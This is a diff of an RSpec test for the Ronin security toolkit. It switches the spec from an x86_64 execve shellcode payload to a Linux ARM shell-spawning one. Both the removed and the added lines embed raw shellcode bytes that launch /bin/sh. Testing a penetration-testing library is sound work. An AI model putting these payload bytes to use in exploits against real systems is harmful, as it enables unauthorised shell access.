@@ -1,7 +1,7 @@
 require 'spec_helper'
-require 'ronin/payloads/builtin/shellcode/linux/x86_64/execve'
+require 'ronin/payloads/builtin/shellcode/linux/arm/exec_shell'
 
-describe Ronin::Payloads::Shellcode::Linux::X86_64::Execve do
+describe Ronin::Payloads::Shellcode::Linux::ARM::ExecShell do
   it "must inherit from Ronin::Payloads::ShellcodePayload" do
     expect(described_class).to be < Ronin::Payloads::ShellcodePayload
   end
@@ -9,16 +9,16 @@ describe Ronin::Payloads::Shellcode::Linux::X86_64::Execve do
   describe ".id" do
     subject { described_class }
 
-    it "must equal 'shellcode/linux/x86_64/execve'" do
-      expect(subject.id).to eq('shellcode/linux/x86_64/execve')
+    it "must equal 'shellcode/linux/arm/exec_shell'" do
+      expect(subject.id).to eq('shellcode/linux/arm/exec_shell')
     end
   end
 
   describe ".arch" do
     subject { described_class }
 
-    it "must equal :x86_64" do
-      expect(subject.arch).to be(:x86_64)
+    it "must equal :arm" do
+      expect(subject.arch).to be(:arm)
     end
   end
 
@@ -35,7 +35,7 @@ describe Ronin::Payloads::Shellcode::Linux::X86_64::Execve do
 
     it "must set #payload" do
       expect(subject.payload).to eq(
-        "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05".b
+        "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68".b
       )
     end
 
